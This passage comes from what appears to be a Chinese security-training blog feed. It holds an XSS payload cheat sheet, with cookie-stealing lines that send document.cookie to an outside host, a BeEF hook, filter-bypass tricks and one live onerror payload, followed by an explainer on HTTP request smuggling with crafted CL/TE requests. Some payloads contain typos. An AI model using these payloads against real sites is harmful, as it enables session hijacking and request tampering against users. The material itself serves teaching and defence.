方法"></a>常用 javascript 方法</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">alert        alert() 方法用于显示带有一条指定消息和一个确认按钮的警告框。<br><br>window.<span class="hljs-keyword">location</span>   <span class="hljs-title">用于获得当前页面的地址url</span>，并把浏览器重定向到新的页面。<br><br>location.href     返回当前显示的文档的完整 URL<br><br>onload            一张页面或一幅图像完成加载<br><br>onsubmit           确认按钮被点击<br><br>onerror            在加载文档或图像时发生错误<br></code></pre></td></tr></table></figure><h3 id="构造-XSS-脚本"><a href="#构造-XSS-脚本" class="headerlink" title="构造 XSS 脚本"></a>构造 XSS 脚本</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs xml">弹窗警告<br>此脚本实现弹窗框提示，一般作为漏洞测试或者演示使用，类似SQL注入测试中的单引号，一旦脚本能执行，也就意味着后端服务器没有对特殊字符做过滤 <span class="hljs-tag">&lt;&gt;</span> \ &#x27; ,这样就可以证明，这个页面存在xss漏洞。<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-string">&#x27;xss&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br>页面嵌套<br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">http://www.baidu.com</span> <span class="hljs-attr">width</span>=<span class="hljs-string">300</span> <span class="hljs-attr">height</span>=<span class="hljs-string">300</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">http://www.baidu.com</span> <span class="hljs-attr">width</span>=<span class="hljs-string">0</span> <span class="hljs-attr">height</span>=<span class="hljs-string">0</span> <span class="hljs-attr">border</span>=<span class="hljs-string">0</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br>页面重定向<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">windows.location=<span class="hljs-string">&quot;http://www.baidu.com&quot;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">location.href=<span class="hljs-string">&quot;http://www.baidu.com&quot;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br>弹窗警告并重定向<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-string">&quot;hello world!&quot;</span>);location.href=<span class="hljs-string">&quot;http:/www.baidu.com&quot;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br>访问恶意代码<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://www.xxx.com/xx.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>可结合 beef 收集用户cookie<br><br>巧用图片标签<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(</span>&#x27;<span class="hljs-attr">xss</span>&#x27;)&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://BeFF_IP:3000/book.js&quot;</span>&gt;</span><br><br>绕开过滤的脚本<br>大小写 <span class="hljs-tag">&lt;<span class="hljs-name">ScRIpt</span>&gt;</span><span class="javascript">alert(<span class="hljs-string">&#x27;xss&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">ScRiPT</span>&gt;</span><br>字符编码  采用URL、Base64 等编码<br>javasc<span class="hljs-symbol">&amp;#x72;</span>ipt:alert(123)<br><br>收集用户cookie<br>打开新窗口并且采用本地cookie访问目标页，<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">window</span>.open(<span class="hljs-string">&quot;http://www.baidu.com/cookie.php?cookie=&quot;</span>+<span class="hljs-built_in">document</span>.cookie<span class="hljs-string">&quot;)</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">document</span>.location=<span class="hljs-string">&quot;http://www.baidu.com&quot;</span>/cookie.php?cookie=<span class="hljs-string">&quot;+document.cookie&quot;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://www.baidu.com&quot;</span>/<span class="hljs-attr">cookie.php</span>?<span class="hljs-attr">cookie</span>=<span class="hljs-string">&quot;+document.cookie&gt;&lt;/img&gt;</span></span><br><span class="hljs-string"><span class="hljs-tag">&lt;iframe src=&quot;</span><span class="hljs-attr">http:</span>//<span class="hljs-attr">www.baidu.com</span>&quot;/<span class="hljs-attr">cookie.php</span>?<span class="hljs-attr">cookie</span>=<span class="hljs-string">&quot;+document.cookie&gt;&lt;/iframe&gt;</span></span><br><span class="hljs-string"><span class="hljs-tag">&lt;script&gt;new Image().src=&quot;</span><span class="hljs-attr">http:</span>//<span class="hljs-attr">www.baidu.com</span>&quot;/<span class="hljs-attr">cookie.php</span>?<span class="hljs-attr">cookie</span>=<span class="hljs-string">&quot;+document.cookie;img.width=0;img.height=0;&lt;/script&gt;</span></span><br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.利用&lt;&gt;标记，构造&lt;script&gt;标签可执行 javascript 的 xss 代码。</p><p>xss 过滤函数需过滤&lt;&gt;&lt;script&gt;&lt;/script&gt;等字符。</p><p>2.利用 html 标签属性支持 javascript:伪协议（支持标签属性的有 href、lowsrc、bgsound、background、value、action、dynsrc 等），执行 xss 代码。</p><p>xss 过滤函数需过滤 JavaScript 等关键字。</p><p>3.利用 javascript 在引号中只用分号分隔单词或强制语句结束，用换行符忽略分号强制结束一个完整语句，而忽略回车、空格、tab 等键，绕过对 javascript 的关键字的过滤。</p><p>4.利用 html 标签属性值支持 ascii 码，对标签属性值进行转码进行规则库的绕过。</p><p>xss 过滤函数需过滤&amp;#\等字符。</p><p>5.利用事件处理函数，触发事件，执行 xss 代码。例如<code>&lt;img src=&#39;#&#39; onerror=alert(/xss/)&gt;</code>,当浏览器响应页面时，找不到图片的地址，触发 onerror 事件。</p><p>6.利用 css 执行 javascript 代码</p><blockquote><p>css 代码中利用 expression 触发 xss 漏洞。如下所示：</p><p>&lt;div style=”width: expression(alert(‘xss’));&gt;</p><p>&lt;img src=”#” style=”xss:expression(alert(/xss/));”&gt;</p><p>&lt;style&gt;body {background-image:expression(alert(“xss”));}&lt;/style&gt;</p><p>&lt;div style=”list-style-image:url(javascript:alert(‘xss’))”&gt;</p><p>css 代码中利用@import 触发 xss</p><p>&lt;stytle&gt;</p><p>@import ‘javascript:alert(“XSS”)’;</p><p>&lt;/stytle&gt;</p><p>css 代码中使用@import 和 link 方式导入外部含有 xss 代码的样式表文件</p><p>&lt;link rel=”stytlesheet” href=”<a href="http://www.***.com/a.css&quot;&gt;">http://www.***.com/a.css&quot;&gt;</a></p><p>&lt;stytle type=’text/css’&gt;@import url(<a href="http://www.*.com/a.css);/">http://www.*.com/a.css);\</a></style></p><p>xss 过滤函数需过滤 style 标签、style 属性、expression、javascript、import 等关键字。</p></blockquote><p>7.利用大小写混淆、使用单引号、不使用引号、使用/插入在 img src 中间、构造不同的全角字符、运用/**/混淆过滤规则来绕过过滤函数</p><p>8.利用字符编码。javascript 支持 unicode、escapes、十六进制、八进制等编码形式。</p><img src='#' onerror=alert(/hacked/)>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTTP走私攻击</title>
    <link href="/2021/06/04/HTTP%E8%B5%B0%E7%A7%81%E6%94%BB%E5%87%BB/"/>
    <url>/2021/06/04/HTTP%E8%B5%B0%E7%A7%81%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h3 id="0x01-HTTP请求走私是什么"><a href="#0x01-HTTP请求走私是什么" class="headerlink" title="0x01 HTTP请求走私是什么"></a>0x01 HTTP请求走私是什么</h3><p>HTTP请求走私是一种干扰网站处理从一个或多个用户接收的HTTP请求序列的方式的技术。使攻击者可以绕过安全控制，未经授权访问敏感数据并直接危害其他应用程序用户。</p><h3 id="0x02-为什么会产生HTTP请求走私"><a href="#0x02-为什么会产生HTTP请求走私" class="headerlink" title="0x02 为什么会产生HTTP请求走私"></a>0x02 为什么会产生HTTP请求走私</h3><p><strong>请求走私漏洞成因</strong></p><blockquote><p>前端服务器(CDN)和后端服务器接收数据不同步，引起对客户端传入的数据理解不一致，从而导致漏洞的产生。</p></blockquote><p>大多数HTTP请求走私漏洞的出现是因为HTTP规范提供了两种不同的方法来指定请求的结束位置：<code>Content-Length</code>标头和<code>Transfer-Encoding</code>标头。<br> 同时使用两种不同的方法时，<code>Content-Length</code>无效。当使用多个服务器时，对客户端传入的数据理解不一致时，就会出现有些服务器认为<code>Content-Length</code>的长度有效，有些以<code>Transfer-Encoding</code>有效。而一般情况下，反向代理服务器与后端的源站服务器之间，会重用TCP链接。这样超出的长度就会拼接到下一次请求进行请求，从而导致HTTP请求走私漏洞。</p><p><strong>RFC2616规范</strong></p><blockquote><p>如果接收的消息同时包含传输编码头字段(Transfer-Encoding)和内容长度头(Content-Length)字段，则必须忽略后者。</p></blockquote><p>由于规范默许可以使用<code>Transfer-Encoding</code>和<code>Content-Length</code>处理请求，因此很少有服务器拒绝此类请求。每当我们找到一种方法，将<code>Transfer-Encoding</code>隐藏在服务端的一个<code>chain</code>中时，它将会回退到使用<code>Content-Length</code>去发送请求。</p><p><strong>走私攻击实现</strong><br> 当向代理服务器发送一个比较模糊的HTTP请求时，由于两者服务器的实现方式不同，代理服务器可能认为这是一个HTTP请求，然后将其转发给了后端的源站服务器，但源站服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那一部分，就算是走私的请求，当该部分对正常用户的请求造成了影响之后，就实现了HTTP走私攻击。</p><h4 id="扩展：为什么会出现多次请求"><a href="#扩展：为什么会出现多次请求" class="headerlink" title="扩展：为什么会出现多次请求"></a>扩展：为什么会出现多次请求</h4><p>这与最为广泛的HTTP 1.1的协议特性——<code>Keep-Alive&amp;Pipeline</code>有关。<br> 在<code>HTTP1.0</code>之前的协议设计中，客户端每进行一次HTTP请求，需要同服务器建立一个TCP链接。<br> 而现代的Web页面是由多种资源组成的，要获取一个网页的内容，不仅要请求HTML文档，还有JS、CSS、图片等各种资源，如果按照之前的协议设计，就会导致HTTP服务器的负载开销增大。于是在<code>HTTP1.1</code>中，增加了<code>Keep-Alive</code>和<code>Pipeline</code>这两个特性。</p><p><strong>Keep-Alive</strong>：在HTTP请求中增加一个特殊的请求头<code>Connection: Keep-Alive</code>，告诉服务器，接收完这次HTTP请求后，不要关闭<code>TCP链接</code>，后面对相同目标服务器的HTTP请求，重用这一个TCP链接。这样只需要进行一次TCP握手的过程，可以减少服务器的开销，节约资源，还能加快访问速度。这个特性在<code>HTTP1.1</code>中默认开启的。<br> **Pipeline(http管线化)**：http管线化是一项实现了多个http请求但不需要等待响应就能够写进同一个socket的技术，仅有http1.1规范支持http管线化。在这里，客户端可以像流水线一样发送自己的<code>HTTP</code>请求，而不需要等待服务器的响应，服务器那边接收到请求后，需要遵循先入先出机制，将请求和响应严格对应起来，再将响应发送给客户端。</p><p>现在，浏览器默认不启用<code>Pipeline</code>的，但是一般的服务器都提供了对<code>Pipleline</code>的支持。<br> 下面这是典型的CDN加速图和拓扑结构图<br> CDN加速图<br> <img src="https://xzfile.aliyuncs.com/media/upload/picture/20191027233501-56f060b8-f8cf-1.jpg"><br> 拓扑结构图<br> <img src="https://xzfile.aliyuncs.com/media/upload/picture/20191027233515-5f360af2-f8cf-1.png"></p><h3 id="0x03-如何执行HTTP请求走私攻击"><a href="#0x03-如何执行HTTP请求走私攻击" class="headerlink" title="0x03 如何执行HTTP请求走私攻击"></a>0x03 如何执行HTTP请求走私攻击</h3><p>HTTP请求走私攻击涉及将<code>Content-Length</code>标头和<code>Transfer-Encoding</code>标头都放置在单个HTTP请求中并进行处理，以便前端服务器和后端服务器以不同的方式处理请求。完成此操作的确切方式取决于两个服务器的行为：</p><blockquote><p>CL.TE：前端服务器使用Content-Length标头，而后端服务器使用Transfer-Encoding标头。<br> TE.CL：前端服务器使用Transfer-Encoding标头，而后端服务器使用Content-Length标头。<br> TE.TE：前端服务器和后端服务器都支持Transfer-Encoding标头，但是可以通过对标头进行某种方式的混淆来诱导其中一台服务器不对其进行处理。</p></blockquote><h3 id="0x04-HTTP请求走私攻击的五种方式"><a href="#0x04-HTTP请求走私攻击的五种方式" class="headerlink" title="0x04 HTTP请求走私攻击的五种方式"></a>0x04 HTTP请求走私攻击的五种方式</h3><h4 id="CL不为0"><a href="#CL不为0" class="headerlink" title="CL不为0"></a>CL不为0</h4><p>所有不携带请求体的HTTP请求都有可能受此影响。这里用GET请求举例。<br> 前端代理服务器允许GET请求携带请求体；后端服务器不允许GET请求携带请求体，它会直接忽略掉GET请求中的<code>Content-Length</code>头，不进行处理。这就有可能导致请求走私。</p><p><strong>构造请求示例</strong>：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">GET / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: test.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Content-Length: 44<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><br>GET / secret HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: test.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><blockquote><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">\r\n`是换行的意思，windows的换行是`\r\n`，unix的是`\n`，mac的是`\r<br></code></pre></td></tr></table></figure></blockquote><p><strong>攻击流程</strong>：<br> 前端服务器收到该请求，读取<code>Content-Length</code>，判断这是一个完整的请求。<br> 然后转发给后端服务器，后端服务器收到后，因为它不对<code>Content-Length</code>进行处理，由于<code>Pipeline</code>的存在，后端服务器就认为这是收到了两个请求，分别是：</p><p>第一个：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">GET / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: test.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>第二个：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">GET / secret HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: test.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>所以造成了请求走私。</p><h4 id="CL-CL"><a href="#CL-CL" class="headerlink" title="CL-CL"></a>CL-CL</h4><p><strong>RFC7230规范</strong></p><blockquote><p>在RFC7230的第3.3.3节中的第四条中，规定当服务器收到的请求中包含两个<code>Content-Length</code>，而且两者的值不同时，需要返回400错误。</p></blockquote><p>有些服务器不会严格的实现该规范，假设中间的代理服务器和后端的源站服务器在收到类似的请求时，都不会返回400错误。<br> 但是中间代理服务器按照第一个<code>Content-Length</code>的值对请求进行处理，而后端源站服务器按照第二个<code>Content-Length</code>的值进行处理。<br> <strong>构造请求示例</strong>：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">POST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: test.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Content-Length: 8<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Content-Length: 7<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><br>12345<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>a<br></code></pre></td></tr></table></figure><p><strong>攻击流程</strong>：<br> 中间代理服务器获取到的数据包的长度为8，将上述整个数据包原封不动的转发给后端的源站服务器。<br> 而后端服务器获取到的数据包长度为7。当读取完前7个字符后，后端服务器认为已经读取完毕，然后生成对应的响应，发送出去。而此时的缓冲区去还剩余一个字母<code>a</code>，对于后端服务器来说，这个<code>a</code>是下一个请求的一部分，但是还没有传输完毕。<br> 如果此时有一个其他的正常用户对服务器进行了请求：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">GET /index.html HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: test.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>因为代理服务器与源站服务器之间一般会重用TCP连接。所以正常用户的请求就拼接到了字母<code>a</code>的后面，当后端服务器接收完毕后，它实际处理的请求其实是：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">aGET /index.html HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: test.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>这时，用户就会收到一个类似于<code>aGET request method not found</code>的报错。这样就实现了一次HTTP走私攻击，而且还对正常用户的行为造成了影响，而且还可以扩展成类似于CSRF的攻击方式。</p><p>但是一般的服务器都不会接受这种存在两个请求头的请求包。该怎么办呢？<br> 所以想到前面所说的<br> <strong>RFC2616规范</strong></p><blockquote><p>如果收到同时存在<code>Content-Length</code>和<code>Transfer-Encoding</code>这两个请求头的请求包时，在处理的时候必须忽略<code>Content-Length</code>。</p></blockquote><p>所以请求包中同时包含这两个请求头并不算违规，服务器也不需要返回400错误。导致服务器在这里的实现更容易出问题。</p><h4 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE"></a>CL-TE</h4><p>CL-TE，就是当收到存在两个请求头的请求包时，前端代理服务器只处理<code>Content-Length</code>请求头，而后端服务器会遵守<code>RFC2616</code>的规定，忽略掉<code>Content-Length</code>，处理<code>Transfer-Encoding</code>请求头。</p><p><strong>chunk传输数据(size的值由16进制表示)</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">[chunk size][\r\n][chunk data][\r\n][chunk size][\r\n][chunk data][\r\n][chunk size = <span class="hljs-number">0</span>][\r\n][\r\n]<br></code></pre></td></tr></table></figure><p><strong>chunked编码</strong><br> 参考：<a href="https://blog.csdn.net/yankai0219/article/details/8269922">http协议中content-length 以及chunked编码分析</a><br> <strong>构造请求示例</strong>：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">POST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: test.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>......<br>Connection: keep-alive<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Content-Length: 6<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Transfer-Encoding: chunked<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>a<br></code></pre></td></tr></table></figure><p>连续发送几次请求就可以获得响应。<br> <strong>攻击流程</strong>：<br> 由于前端服务器处理<code>Content-Length</code>，所以这个请求对于它来说是一个完整的请求，请求体的长度为6，也就是</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>a<br></code></pre></td></tr></table></figure><p>当请求包经过代理服务器转发给后端服务器时，后端服务器处理<code>Transfer-Encoding</code>，当它读取到</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>认为已经读取到结尾了。<br> 但剩下的字母<code>a</code>就被留在了缓冲区中，等待下一次请求。当我们重复发送请求后，发送的请求在后端服务器拼接成了类似下面这种请求：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">aPOST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: test.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>......<br></code></pre></td></tr></table></figure><p>服务器在解析时就会产生报错了，从而造成HTTP请求走私。</p><h4 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE-CL"></a>TE-CL</h4><p>TE-CL，就是当收到存在两个请求头的请求包时，前端代理服务器处理<code>Transfer-Encoding</code>请求头，后端服务器处理<code>Content-Length</code>请求头。<br> <strong>构造请求示例</strong>：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">POST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: test.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>......<br>Content-Length: 4<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Transfer-Encoding: chunked<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>12<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>aPOST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p><strong>攻击流程</strong>：<br> 前端服务器处理<code>Transfer-Encoding</code>，当其读取到</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>认为是读取完毕了。<br> 此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器，后端服务器处理<code>Content-Length</code>请求头，因为请求体的长度为<code>4</code>.也就是当它读取完</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">12<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>就认为这个请求已经结束了。后面的数据就认为是另一个请求：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">aPOST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>成功报错，造成HTTP请求走私。</p><h4 id="TE-TE"><a href="#TE-TE" class="headerlink" title="TE-TE"></a>TE-TE</h4><p>TE-TE，当收到存在两个请求头的请求包时，前后端服务器都处理<code>Transfer-Encoding</code>请求头，确实是实现了RFC的标准。不过前后端服务器不是同一种。这就有了一种方法，我们可以对发送的请求包中的<code>Transfer-Encoding</code>进行某种混淆操作(如某个字符改变大小写)，从而使其中一个服务器不处理<code>Transfer-Encoding</code>请求头。在某种意义上这还是<code>CL-TE</code>或者<code>TE-CL</code>。<br> <strong>构造请求示例</strong>：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">POST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: test.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>......<br>Content-length: 4<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Transfer-Encoding: chunked<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Transfer-encoding: cow<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>5c<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>aPOST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Content-Type: application/x-www-form-urlencoded<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Content-Length: 15<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>x=1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p><strong>攻击流程</strong>：<br> 前端服务器处理<code>Transfer-Encoding</code>，当其读取到</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>认为是读取结束。<br> 